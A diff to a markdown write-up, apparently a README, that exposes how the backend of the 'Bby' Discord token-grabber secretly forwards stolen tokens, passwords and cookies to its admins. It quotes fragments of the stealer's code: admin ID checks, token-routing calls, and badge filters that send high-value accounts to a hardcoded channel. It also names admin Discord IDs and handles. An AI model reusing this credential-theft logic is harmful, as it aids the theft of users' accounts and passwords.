@@ -58,7 +58,9 @@ This info might just make you reconsider how much trust and money you put into B
 Bby's backend code has **a few key points of interest**. 
 
 # Exhibit #1:
-- ```const admins = ["454317547622367232", "917648088582197298"]```;  
+```js
+const admins = ["454317547622367232", "917648088582197298"]
+```
 The user IDs of the admins.  
 454317547622367232 = brunxkd#3333  
 917648088582197298 = c0lzia#9999  
@@ -68,20 +70,22 @@ These IDs are checked for in the `sendEmbed()` method to find the admin channels
 
 # Exhibit #2:
 When your victim opens the malware, it calls an API `/yourname/tokens`  
-- ```getTokenInfo(data, clients[req.params.name], ip, false)```
-- ```getTokenInfo(tokens, channelId, ip = undefined, dualHook = false)```
+```js
+getTokenInfo(data, clients[req.params.name], ip, false)
+getTokenInfo(tokens, channelId, ip = undefined, dualHook = false)
+```
 
 "Wait, I thought you said it was dual hooked"  
-Well, the shit tokens (Early supporter, etc) aren't. But ALL the passwords.txt and cookies.txt are!  
+Well, the shit tokens (Early supporter, etc) aren't ~~they don't care about low value accounts~~. But ALL the passwords.txt and cookies.txt are!  
 However, if you observe the above code, all they need to change is the "false" to "true", and that's it.
 That. is. it! False to True and all your grabbed accouts are belong to us.  
 
-Just look at **Exhibit #3**, this is the juicy shit.  
+Just look at **Exhibit #3**, this is the **juicy shit**.  
 
 # Exhibit #3:
 Oh my, if "discord_partner", "hypesquad"... What next?  
 Observe this code.  
-```
+```js
 if (badges.includes("discord_partner") || badges.includes("HypeSquad_Event") || badges.includes("Bug_Hunter") || badges.includes("Discord_certified_moderator") || badges.includes("Verified_Bot_Developer")) {
     sendEmbed([embed, (await getHQFriendList(token))], "907326009479667735", true); // Sends the token to admins. Look at the "true" at the end.
     return; // Exit the code execution
@@ -90,7 +94,7 @@ sendEmbed([embed, (await getHQFriendList(text.token))], channelId, true);
 ```
 This code looks for all the ULTRA rare accounts. And then sends it to a hard coded channel ID `907326009479667735` and `true` = admin.
 Just as a refresher, check the method for sendEmbed()  
-```
+```js
 async function sendEmbed(embeds = [], >> channelId = 0, admin = false <<) // These >> two parameters << are important, duhhh!
 ```
 If the 2nd parameter is set, it'll hard code a channel to send to. If the last parameter is true, it sends it to the admins.  
@@ -108,7 +112,7 @@ Aww how sad this is.
 
 # Exhibit #4:
 All the passwords and cookies are dualhooked... **All. of. them.**
-```
+```js
 // Send to the skidz
 client.channels.cache.get(clients[req.params.name])
 	.send({
